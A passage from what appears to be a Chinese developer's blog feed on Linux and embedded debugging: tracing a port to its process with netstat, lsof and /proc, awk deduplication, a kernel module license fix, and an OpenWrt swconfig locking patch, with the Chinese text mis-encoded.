<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>ä½¿ç”¨<code>netstat</code>å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿç½‘ç»œçŠ¶æ€ï¼Œ<code>-p</code>å‚æ•°å¯ä»¥æ˜¾ç¤ºå¯¹åº”çš„è¿›ç¨‹ä¿¡æ¯<code>pid/process</code></p>
<pre><code class="bash">$ netstat -anp |grep &quot;:23&quot;
tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN      3698/utelnetd
tcp        0      0 192.168.1.1:23          192.168.1.10:10381      ESTABLISHED 3698/utelnetd
</code></pre>
<p>ä»ä¸Šé¢çš„ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°ä¸¤æ¡ä¿¡æ¯ï¼š</p>
<ol>
<li>ç›‘å¬23ç«¯å£çš„è¿›ç¨‹æ˜¯pidä¸º<code>3698</code>çš„<code>utelnetd</code></li>
<li>ç›®å‰å­˜åœ¨ä¸€ä¸ªå·²è¿æ¥çš„clientï¼Œclient IPä¸º<code>192.168.1.10</code>ï¼Œtcpè¿æ¥ç«¯å£ä¸º<code>10381</code></li>
</ol>
<h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>åœ¨<code>Linux</code>ç³»ç»Ÿä¸­ï¼Œä¸€åˆ‡çš†ä¸ºæ–‡ä»¶ï¼Œsocketä¹Ÿä¸ä¾‹å¤–ï¼Œè€Œ<code>lsof</code>æŒ‡ä»¤ç”¨äº<code>list open files</code>ï¼Œèƒ½å¤Ÿæ˜¾ç¤ºç³»ç»Ÿæ‰€æœ‰å·²ç»æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ ¹æ®ä¸Šé¢å·²çŸ¥çš„è¿›ç¨‹pidæˆ–è¿›ç¨‹åç§°ï¼Œå¯ä»¥grepåˆ°ç›¸å…³ä¿¡æ¯ã€‚</p>
<pre><code class="bash">$ lsof |grep utelnetd
3698    /usr/sbin/utelnetd      /dev/console
3698    /usr/sbin/utelnetd      /dev/console
3698    /usr/sbin/utelnetd      /dev/null
3698    /usr/sbin/utelnetd      socket:[12882]
3698    /usr/sbin/utelnetd      socket:[349364]
</code></pre>
<p>å¯ä»¥çœ‹å‡ºï¼Œ<code>utelnetd</code>æ‰“å¼€äº†5ä¸ªæ–‡ä»¶ï¼Œå¯¹åº”5ä¸ªfd(file descriptor)ã€‚å‰é¢3ä¸ªåˆ†åˆ«å¯¹åº”æ ‡å‡†è¾“å…¥stdinï¼Œæ ‡å‡†è¾“å‡ºstdoutå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºstderrï¼›æ¥ç€çš„ä¸¤ä¸ªsocketå¯¹åº”çš„å°±æ˜¯<code>netstat</code>æ˜¾ç¤ºçš„1ä¸ªsocket serverå’Œ1ä¸ªsocket clientã€‚</p>
<p><strong>æ³¨ï¼š</strong>socket:[12882]ä¿¡æ¯ä¸­12882å¯¹åº”çš„æ˜¯<code>inode</code>ä¿¡æ¯ï¼Œåé¢<code>proc</code>ä¿¡æ¯ä¸­å¯ä»¥å°è¯ã€‚</p>
<h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>é™¤äº†ä¸Šé¢ä¸¤ä¸ªæŒ‡ä»¤å¤–ï¼Œ<code>proc</code>æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¿¡æ¯ä¹Ÿæ˜¯éå¸¸å¸¸ç”¨çš„ï¼Œæ ¹æ®å·²ç»çš„è¿›ç¨‹pid <code>3698</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è¿›ç¨‹å·²æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶ä»¥åŠsocketä¿¡æ¯ã€‚</p>
<h3 id="æŸ¥çœ‹æ–‡ä»¶æè¿°ç¬¦"><a href="#æŸ¥çœ‹æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶æè¿°ç¬¦"></a>æŸ¥çœ‹æ–‡ä»¶æè¿°ç¬¦</h3><pre><code class="bash">$ ls -l /proc/3698/fd/
lr-x------    1 root     root            64 Dec 20 07:57 0 -&gt; /dev/console
l-wx------    1 root     root            64 Dec 20 07:57 1 -&gt; /dev/console
l-wx------    1 root     root            64 Dec 20 07:57 2 -&gt; /dev/null
lrwx------    1 root     root            64 Dec 20 07:57 3 -&gt; socket:[12882]
lrwx------    1 root     root            64 Dec 20 07:57 4 -&gt; socket:[349364]
</code></pre>
<p>å‰3ä¸ª0,1,2å¯¹åº”çš„å°±æ˜¯stdin,stdoutå’Œstderrï¼›3,4å¯¹åº”çš„å°±æ˜¯ä¸¤æ¡socketè¿æ¥ã€‚</p>
<h3 id="æŸ¥çœ‹socketä¿¡æ¯"><a href="#æŸ¥çœ‹socketä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹socketä¿¡æ¯"></a>æŸ¥çœ‹socketä¿¡æ¯</h3><pre><code class="bash">$ cat /proc/3698/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
     0: 00000000:0D05 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 13663 1 de008000 100 0 0 10 0
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28897 1 de008500 100 0 0 10 0
   2: 00000000:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28962 1 de008f00 100 0 0 10 0
   3: 0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0
   4: 00000000:01BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28898 1 de008a00 100 0 0 10 0
   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1
</code></pre>
<p>è¿™ä¸ªæ–‡ä»¶æ˜¾ç¤ºçš„æ˜¯å½“å‰è¿›ç¨‹ç›¸å…³çš„tcpè¿æ¥ä¿¡æ¯ï¼Œç›®å‰æˆ‘ä»¬ä»…è€ƒè™‘ç«¯å£å·ä¸º23çš„è¿æ¥ï¼Œç”±äºå½“å‰æ•°æ®å‡ä¸º16è¿›åˆ¶ï¼Œæ‰€ä»¥grepæ—¶ä½¿ç”¨23çš„16è¿›åˆ¶æ•°17</p>
<pre><code class="bash">$ grep &quot;17\|sl&quot; /proc/3698/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
   3: 0101A8C0:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12882 1 dcd20000 100 0 0 10 0
   5: 0101A8C0:0017 0A01A8C0:288D 01 00000000:00000000 00:00000000 00000000     0        0 349364 1 de00b700 24 8 25 10 -1
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªä¿¡æ¯ï¼Œå…ˆçœ‹å…¶ä¸€ï¼Œlocal_addressä¸º<code>0101A8C0:0017</code>ï¼Œè§£æå¦‚ä¸‹:</p>
<pre><code class="sh">01  01  A8  C0:  0017
1   1   168 192: 23
</code></pre>
<p>æ³¨æ„ç½‘ç»œåœ°å€ä¸æœ¬åœ°åœ°å€çš„é¡ºåºï¼Œè½¬æ¢ä¸º10è¿›åˆ¶ä¾¿æ˜¯<code>192.168.1.1:23</code>ï¼Œå…¶å¯¹åº”çš„<code>inode</code>å°±æ˜¯<code>12882</code>ï¼Œä¸<code>lsof</code>çœ‹åˆ°çš„ä¸€è‡´ã€‚</p>
<p>åŒç†ï¼Œç¬¬2æ¡ä¿¡æ¯ï¼Œæœ¬åœ°åœ°å€ä¸€è‡´ï¼Œè¿œç¨‹åœ°å€<code>0A01A8C0:288D</code>å¯¹åº”10è¿›åˆ¶<code>192.168.1.10:10381</code>ä¸ä¸Šè¿°<code>netstat</code>çœ‹åˆ°çš„ä¸€è‡´ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ ¹æ®ç«¯å£å·æŸ¥æ‰¾è¿›ç¨‹åŠç«¯å£ç›¸åº”çš„fdï¼Œå¯ä»¥é€šè¿‡<code>netstat</code>,<code>lsof</code>,<code>proc</code>æ–‡ä»¶ç³»ç»Ÿ3ç§æ–¹å¼ååŒå®Œæˆã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[awk '!a[$0]++'å»é‡å°æŠ€å·§]]></title>
      <url>https://www.litreily.top/2020/01/09/awk_dedup/</url>
      <content type="html"><![CDATA[<p>ä»Šå¤©ç¢°åˆ°ä¸€ä¸ªå…³äºawkçš„å»é‡ç”¨æ³•ï¼Œè§‰å¾—æŒºæœ‰æ„æ€çš„ï¼Œè®°å½•ä¸€ä¸‹</p>
<h2 id="awk-æŒ‰è¡Œå»é‡"><a href="#awk-æŒ‰è¡Œå»é‡" class="headerlink" title="awk æŒ‰è¡Œå»é‡"></a>awk æŒ‰è¡Œå»é‡</h2><p><code>awk &#39;!a[$0]++&#39; file</code> æ˜¯ä¸ªç¥å¥‡çš„ç”¨æ³•ï¼Œé€šè¿‡å®ƒå¯ä»¥å®ç°æ–‡ä»¶å†…å®¹å»é‡</p>
<ul>
<li><code>$0</code>: ä»£è¡¨æ•´è¡Œ</li>
<li><code>a[]</code>: ä»£è¡¨æ•°ç»„a,åç§°éšæ„,é¦–æ¬¡è°ƒç”¨æ—¶ä¸ºç©º</li>
<li><code>++</code>:ã€€ä¸<code>C/C++</code>ä¸­çš„<code>++</code>ä¸€ä¸ªå«ä¹‰ï¼Œ<code>i++</code>å…ˆä½¿ç”¨iåiè‡ªå¢1ï¼Œ<code>++i</code>ä»£è¡¨iå…ˆè‡ªå¢1ç„¶åè¢«ä½¿ç”¨</li>
<li><code>!</code>: ä»£è¡¨å–å</li>
</ul>
<p>æ‰€ä»¥<code>a[$0]</code>ä»£è¡¨å¯¹å½“å‰è¡Œæ„å»ºä¸€ä¸ªåä¸ºaçš„æ•°ç»„ï¼Œé¦–æ¬¡æ„å»ºåå…¶å€¼ä¸º0</p>
<p><code>a[$0]++</code>ä»£è¡¨å…ˆä½¿ç”¨<code>a[$0]</code>çš„å€¼ï¼Œç„¶å<code>a[$0]</code>çš„å€¼è‡ªå¢1ã€‚é¦–æ¬¡è°ƒç”¨è‡ªç„¶å°±æ˜¯0,ä¸‹æ¬¡é‡åˆ°é‡å¤çš„è¡Œå°±å˜ä¸º1ï¼Œæ‰€ä»¥ä¸åŠ <code>!</code>çš„æƒ…å†µä¸‹ï¼Œè¯¥è¯­æ³•ç”¨äºæ‰“å°é‡å¤é¡¹ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­â†“</p>
<pre><code class="bash">$ cat test
aaa
bbb
aaa
ccc
bbb
aaa
ddd
bbb
$ awk &#39;a[$0]++&#39; test
aaa
bbb
aaa
bbb
</code></pre>
<p>å®ƒæŠŠæ–‡ä»¶ä¸­é‡å¤çš„è¡Œéƒ½æ‰“å°å‡ºæ¥äº†ã€‚ä¸ºäº†å»é‡ï¼Œæˆ‘ä»¬åªéœ€åœ¨å‰é¢åŠ ä¸ªå–åç¬¦<code>!</code>å³å¯ï¼Œè¿™ä¾¿æ˜¯<code>!a[$0]++</code>äº†</p>
<pre><code class="bash">$ awk &#39;!a[$0]++&#39; test
aaa
bbb
ccc
ddd
</code></pre>
<h2 id="awk-æŒ‰åˆ—å»é‡"><a href="#awk-æŒ‰åˆ—å»é‡" class="headerlink" title="awk æŒ‰åˆ—å»é‡"></a>awk æŒ‰åˆ—å»é‡</h2><p>ä¸Šé¢ä½¿ç”¨<code>$0</code>æ„å»ºæ•°ç»„ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ç¬¬iåˆ—çš„å€¼<code>$i</code>æ„å»ºæ•°ç»„ï¼Œä½¿ç”¨<code>awk &#39;!a[$i]++&#39; file</code>åˆ™å¯ä»¥æŒ‰ç…§æŒ‡å®šåˆ—çš„å…³é”®è¯å®ç°å»é‡â†“</p>
<pre><code class="bash">$ cat test
aaa 111
bbb 222
aaa 222
ccc 222
bbb 333
aaa 444
ddd 111
bbb 111
$ awk &#39;!a[$2]++&#39; test
aaa 111
bbb 222
bbb 333
aaa 444
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œtestæ–‡ä»¶ä¸­ç¬¬2åˆ—å‡ä¸é‡å¤ï¼Œä½†æ˜¯å…¶å®ƒåˆ—å…è®¸é‡å¤ã€‚è¿™ç§ç”¨æ³•åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹æ˜¯éå¸¸å®ç”¨çš„ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> awk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[insmodå†…æ ¸æ¨¡å—æç¤ºUnknown Symbolé—®é¢˜å¤„ç†]]></title>
      <url>https://www.litreily.top/2019/11/07/unknown_symbol/</url>
      <content type="html"><![CDATA[<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>åœ¨è°ƒè¯•å†…æ ¸crashé—®é¢˜æ—¶æ‰“å¼€äº†<code>lockup</code>ç›¸å…³çš„kernel CONFIGï¼Œé‡æ–°ç¼–è¯‘FWåå‘ç°æœ‰ä¸ªå†…æ ¸æ¨¡å—insmodå¤±è´¥</p>
<pre><code class="log">[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol rcu_bh_lock_map (err 0)
[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_acquire (err 0)
[Wed Nov 06 15:51:57.384 2019] ip6t_CONE: Unknown symbol lock_release (err 0)
</code></pre>
<p>æ‰‹åŠ¨ä½¿ç”¨<code>insmod</code>é‡æ–°åŠ è½½ä¹Ÿæ˜¯æç¤ºç›¸åŒçš„é”™è¯¯ã€‚</p>
<h2 id="é—®é¢˜åˆ†æ"><a href="#é—®é¢˜åˆ†æ" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h2><p>åŸæœ¬è¿™ä¸ªé—®é¢˜æ˜¯ä¸å­˜åœ¨çš„ï¼Œå‡ºç°çš„åŸå› å¿…ç„¶å’Œå¯ç”¨çš„CONFIGç›¸å…³ï¼Œå¯¹æ¯”å‰åä¸¤ä¸ªFWçš„<code>ip6t_CONE.ko</code></p>
<pre><code class="sh"># old .ko
$ strings ip6t_CONE.ko |grep rcu

# new .ko
$ strings ip6t_CONE.ko |grep rcu
rcu_bh_lock_map
</code></pre>
<p>å‘ç°æ–°çš„<code>.ko</code>ç¡®å®åŒ…å«äº†æç¤ºå‡ºé”™çš„é‚£äº›ä¸ª<code>symbol</code>ï¼Œä¸ºäº†æ‰¾å‡ºè¿™äº›å‚æ•°æ˜¯å¯ç”¨å“ªä¸ªCONFIGå¼•å…¥çš„ï¼Œå¯ä»¥å»æŸ¥æ‰¾kernelçš„sourcecode</p>
<p><img src="/assets/kernel/export_symbol.png" alt="export symbol rcu_bh_lock_map"></p>
<p>Got you, å°±æ˜¯è¿™ä¸ª<code>CONFIG_DEBUG_LOCK_ALLOC</code>ï¼Œè¿™ä¸ªCONFIGæ­£æ˜¯ä¹‹å‰æ‰“å¼€lockupç›¸å…³CONFIGä¹‹ä¸€ã€‚å½“ç„¶å…¶å®ƒä¸¤ä¸ªæŠ¥é”™çš„Symbolä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p>
<p>å¯¹åº”çš„CONFIGæ‰¾åˆ°äº†ï¼Œä½†æ˜¯æœ¬æ¥å°±éœ€è¦é€šè¿‡è¿™ä¸ªCONFIGå»è®°å½•ç›¸å…³logï¼Œå½“ç„¶ä¸ç„¶åˆæŠŠå®ƒç¦æ‰ï¼ŒåŠ è½½å¤±è´¥çš„é—®é¢˜ä¹Ÿæ­£æ˜¯æ‰“å¼€è¿™ä¸ªCONFIGæ‰å‘ç°çš„ï¼Œè¯´æ˜æ˜¯ä¸ªæ½œåœ¨é—®é¢˜ã€‚é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Œé¦–å…ˆæˆ‘ä»¬ä»¥ä¸ºæ˜¯è¿™äº›<code>Symbol</code>åœ¨å†…æ ¸ä¸­å·²ç»å¯¼å‡ºäº†ï¼Œä½†æ˜¯<code>ipv6_CONE.ko</code>æ²¡æœ‰å¼•ç”¨çš„ç¼˜æ•…ï¼Œæ‰€ä»¥å°è¯•åœ¨æºæ–‡ä»¶<code>ipv6_CONE.c</code>ä¸­ä½¿ç”¨externè°ƒç”¨ã€‚</p>
<pre><code class="c">extern struct lockdep_map rcu_bh_lock_map;
extern void lock_acquire(struct lockdep_map *lock, unsigned int subclass,
              int trylock, int read, int check,
              struct lockdep_map *nest_lock, unsigned long ip);
extern void lock_release(struct lockdep_map *lock, int nested,
              unsigned long ip);
</code></pre>
<p>äº‹å®è¯æ˜è¿™ä¸ªæ–¹æ³•<strong>ä¸å¯è¡Œ</strong>ï¼Œè¯´æ˜ä¸æ˜¯è¿™ä¸ªæ€è·¯ï¼Œæ‰€ä»¥é‡æ–°å¼€å§‹äº†Googleä¹‹è·¯ï¼Œç»ˆäºï¼ä¸‡èƒ½çš„<code>StackOverflow</code>è®©æˆ‘çœ‹åˆ°äº†å¸Œæœ›</p>
<blockquote>
<p><strong>é—®é¢˜</strong>ï¼š<a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0" target="_blank" rel="noopener">unknown symbol __class_create (err 0)</a></p>
<p>The function <code>__class_create</code> is exported only for GPL modules (exported with <strong>EXPORT_SYMBOL_GPL</strong>). So, you need to use a GPL license with MODULE_LICENSE macro to make use of that function. Same goes for other functions as well.</p>
<p>This should do the trick:<br><strong>MODULE_LICENSE(&quot;GPL&quot;);</strong></p>
</blockquote>
<p>å‘ç°è¿™ä¸ªé—®é¢˜å’Œæˆ‘é‡åˆ°çš„æƒ…å†µåŸºæœ¬ä¸€è‡´ï¼Œç„¶åæˆ‘é‡æ–°æ£€æŸ¥äº†è¿™å‡ ä¸ªSymbolçš„exportæ–¹å¼ï¼Œç¡®å®éƒ½æ˜¯<code>EXPORT_SYMBOL_GPL</code>ï¼Œæ¥ç€æˆ‘å†å»çœ‹<code>ip6t_CONE</code>çš„sourcecodeï¼Œå‘ç°ç¡®å®æ²¡æœ‰å£°æ˜LICENSEï¼ï¼ï¼</p>
<p>å¥½äº†ï¼Œè§£å†³æ–¹æ¡ˆæ¥å•¦ï¼Œç«‹é©¬åŠ ä¸ªkernel patch â†“</p>
<pre><code class="patch">--- kmod-ipv6-cone.orig/ip6t_cone.c 2019-11-07 09:46:42.068839345 +0800
--- kmod-ipv6-cone/ip6t_cone.c 2019-11-07 09:47:45.956071600 +0800
@@ -466,3 +466,8 @@
 module_init(init);
 module_exit(fini);
 #endif
+
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;&quot;);
+MODULE_DESCRIPTION(&quot;IPv6&quot;);
+
</code></pre>
<p>åŠ ä¸Šé‡æ–°ç¼–è¯‘ï¼Œä¸€åˆ‡okï¼Œé‚£äº›æ¼äººçš„logç»ˆäºä¸è§å•¦ï¼Œ<code>ip6t_CONE.ko</code>ä¹Ÿæ­£å¸¸åŠ è½½å®Œæˆï¼Œå®Œç¾ï¼</p>
<h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><ul>
<li><a href="https://stackoverflow.com/questions/29578931/unknown-symbol-class-create-err-0" target="_blank" rel="noopener">unknown symbol __class_create (err 0)</a></li>
<li><a href="http://tuxthink.blogspot.com/2011/07/exporting-symbols-from-module.html" target="_blank" rel="noopener">Exporting symbols from module</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> kernel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[openwrt swconfig stack traceåˆ†æ]]></title>
      <url>https://www.litreily.top/2019/11/06/swconfig_crash/</url>
      <content type="html"><![CDATA[<p>æ¥ä¸Šä¸€ç¯‡åšå®¢ <a href="/2019/11/03/kernel_debug/" title="watchdog biteå¯¼è‡´ç³»ç»Ÿé‡å¯é—®é¢˜çš„è°ƒè¯•">watchdog biteå¯¼è‡´ç³»ç»Ÿé‡å¯é—®é¢˜çš„è°ƒè¯•</a> ï¼Œæ‰“å¼€è°ƒè¯•åŠŸèƒ½åå¼€å§‹å‹åŠ›æµ‹è¯•ï¼Œåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°DUTæ¯éš”2sæ‰“å°ä¸€æ¬¡ä»¥ä¸‹å¼‚å¸¸ä¿¡æ¯</p>
<pre><code class="log">BUG: sleeping function called from invalid context at kernel/locking/mutex.c:616
in_atomic(): 1, irqs_disabled(): 0, pid: 9465, name: swconfig
INFO: lockdep is turned off.
CPU: 2 PID: 9465 Comm: swconfig Tainted: P        W    3.14.77 #1
[&lt;c021561c&gt;] (unwind_backtrace) from [&lt;c0211d44&gt;] (show_stack+0x18/0x1c)
[&lt;c0211d44&gt;] (show_stack) from [&lt;c062ea98&gt;] (dump_stack+0x9c/0xd4)
[&lt;c062ea98&gt;] (dump_stack) from [&lt;c06312d8&gt;] (mutex_lock_nested+0x2c/0x450)
[&lt;c06312d8&gt;] (mutex_lock_nested) from [&lt;c0499df8&gt;] (swconfig_get_dev+0x70/0x88)
[&lt;c0499df8&gt;] (swconfig_get_dev) from [&lt;c049a808&gt;] (swconfig_list_attrs+0x20/0x20c)
[&lt;c049a808&gt;] (swconfig_list_attrs) from [&lt;c054fde8&gt;] (genl_rcv_msg+0x260/0x2e0)
[&lt;c054fde8&gt;] (genl_rcv_msg) from [&lt;c054f2d0&gt;] (netlink_rcv_skb+0x60/0xbc)
[&lt;c054f2d0&gt;] (netlink_rcv_skb) from [&lt;c054fb74&gt;] (genl_rcv+0x28/0x3c)
[&lt;c054fb74&gt;] (genl_rcv) from [&lt;c054ec94&gt;] (netlink_unicast+0x11c/0x1d0)
[&lt;c054ec94&gt;] (netlink_unicast) from [&lt;c054f114&gt;] (netlink_sendmsg+0x30c/0x368)
[&lt;c054f114&gt;] (netlink_sendmsg) from [&lt;c050fb78&gt;] (sock_sendmsg+0x78/0x8c)
[&lt;c050fb78&gt;] (sock_sendmsg) from [&lt;c0511310&gt;] (___sys_sendmsg.part.3+0x184/0x20c)
[&lt;c0511310&gt;] (___sys_sendmsg.part.3) from [&lt;c0512340&gt;] (__sys_sendmsg+0x54/0x78)
[&lt;c0512340&gt;] (__sys_sendmsg) from [&lt;c020df40&gt;] (ret_fast_syscall+0x0/0x50)
</code></pre>
<h2 id="é—®é¢˜åˆ†æ"><a href="#é—®é¢˜åˆ†æ" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h2><p>æ¯éš”2sæ˜¯å› ä¸ºåœ¨<code>detcable</code>æ¨¡å—çš„ä¸»å¾ªç¯ä¸­æ‰§è¡Œäº†ä»¥ä¸‹ä»£ç ï¼Œå¹¶ä¸”åœ¨whileå¾ªç¯ä¸­æ¯2sæ‰§è¡Œä¸€æ¬¡ã€‚</p>
<pre><code class="c">system(&quot;/sbin/swconfig dev switch0 show |grep \&quot;link: port\&quot; &gt; /tmp/switch);
</code></pre>
<p>æ ¹æ®logé¦–è¡Œæç¤º<code>kernel/locking/mutex.c:616</code>æ‰¾åˆ°ç›¸å…³ä»£ç ï¼š</p>
<p><img src="/assets/kernel/mutex.c.png" alt="mutex.c:616"></p>
<p>åœ¨å†…æ ¸ä»£ç ä¸­æœç´¢<code>might_sleep</code>æ‰¾åˆ°å…¶å®šä¹‰äº<code>include/linux/kernel.h</code></p>
<p><img src="/assets/kernel/might_sleep.png" alt="kernel.h might_sleep"></p>
<p>ä»è¯´æ˜ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œè¿™äº›<code>stack trace</code>æç¤º<code>swconfig</code>è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­è¿›å…¥å†…æ ¸æ€æ—¶å¯èƒ½è¿›å…¥ä¸è¢«å…è®¸çš„ç¡çœ çŠ¶æ€ã€‚è€Œè¿™äº›ä¿¡æ¯æ˜¯åœ¨å¯ç”¨<code>CONFIG_DEBUG_ATOMIC_SLEEP</code>åæ‰“å°çš„ï¼Œè¯¥CONFIGæ˜¯åœ¨å¯ç”¨lockupç›¸å…³è°ƒè¯•åŠŸèƒ½æ—¶æ‰“å¼€ï¼Œæ‰€ä»¥æƒ³è¦åœæ­¢æ‰“å°å¯ä»¥ç¦ç”¨è¯¥CONFIGã€‚</p>
<p>ä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªé—®é¢˜æ˜¯swconfigçš„å†…æ ¸é©±åŠ¨å¯¼è‡´çš„ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/kernel/swconfig_drivers.png" alt="swconfig drviers"></p>
<p><code>spinlock</code>è‡ªæ—‹é”ä¸å…è®¸ä¸´ç•ŒåŒºæœ‰è§¦å‘sleepçš„å‡½æ•°ï¼Œè€Œ<code>mutex_lock</code>æ­£å¥½å°±æ˜¯å¯èƒ½è¿›å…¥sleepçŠ¶æ€çš„å‡½æ•°ï¼Œæ‰€ä»¥æ‰è§¦å‘äº†è¿™ä¸ªstack trace</p>
<blockquote>
<p><strong>mutex_lock</strong> â€” acquire the mutex<br>Lock the mutex exclusively for this task. If the mutex is not available right now, it will sleep until it can get it.</p>
</blockquote>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°†åŠ é”æ–¹å¼ç”±<code>spin_lock</code>æ”¹ä¸º<code>mutex_lock</code>ï¼Œè¿™ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ç»„é•¿<code>google</code>æ¥çš„ï¼Œæˆ‘è¿™æ˜¯æ‹¾äººç‰™æ…§äº†ï¼Œå“ˆå“ˆå“ˆã€‚</p>
<pre><code class="patch">index 78569a9..e8a6847 100644 (file)
--- a/target/linux/generic/files/drivers/net/phy/swconfig.c
+++ b/target/linux/generic/files/drivers/net/phy/swconfig.c
@@ -36,7 +36,7 @@ MODULE_LICENSE(&quot;GPL&quot;);

 static int swdev_id;
 static struct list_head swdevs;
-static DEFINE_SPINLOCK(swdevs_lock);
+static DEFINE_MUTEX(swdevs_lock);
 struct swconfig_callback;

 struct swconfig_callback {
@@ -296,13 +296,13 @@ static struct nla_policy link_policy[SWITCH_LINK_ATTR_MAX] = {
 static inline void
 swconfig_lock(void)
 {
-       spin_lock(&amp;swdevs_lock);
+       mutex_lock(&amp;swdevs_lock);
 }

 static inline void
 swconfig_unlock(void)
 {
-       spin_unlock(&amp;swdevs_lock);
+       mutex_unlock(&amp;swdevs_lock);
 }

 static struct switch_dev *
</code></pre>
<p>åŠ å…¥patchåå®Œç¾è§£å†³é—®é¢˜ã€‚</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul>
<li><a href="https://www.kernel.org/doc/htmldocs/kernel-locking/API-mutex-lock.html" target="_blank" rel="noopener">API mutex_lock</a></li>
<li><a href="https://git.openwrt.org/?p=openwrt/openwrt.git;a=commitdiff;h=ed3860c3e3ebe484c00cf603c29e68af28eb0839;ds=inline" target="_blank" rel="noopener">swconfig: convert swdevs_lock from spinlock to mutex</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openwrt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[watchdog biteå¯¼è‡´ç³»ç»Ÿé‡å¯é—®é¢˜çš„è°ƒè¯•]]></title>
      <url>https://www.litreily.top/2019/11/03/kernel_debug/</url>
      <content type="html"><![CDATA[<h2 id="èƒŒæ™¯è¯´æ˜"><a href="#èƒŒæ™¯è¯´æ˜" class="headerlink" title="èƒŒæ™¯è¯´æ˜"></a>èƒŒæ™¯è¯´æ˜</h2><p>STåœ¨åšstress testè¿‡ç¨‹ä¸­å‘ç°ä¸€ä¸ªbugï¼ŒDUTä¼šåœ¨å·¥ä½œä¸€æ®µæ—¶é—´åé‡å¯ï¼Œé‡å¯åŸå› æ˜¯<code>watchdog bite</code></p>
<pre><code class="txt">[Thu Sep 26 09:21:59.734 2019] Watchdog bark! Now = 831425.568038
[Thu Sep 26 09:21:59.734 2019] Causing a watchdog bite!
[Thu Sep 26 09:21:59.734 2019] Configuring Watchdog Timer
[Thu Sep 26 09:21:59.734 2019] Wa
</code></pre>
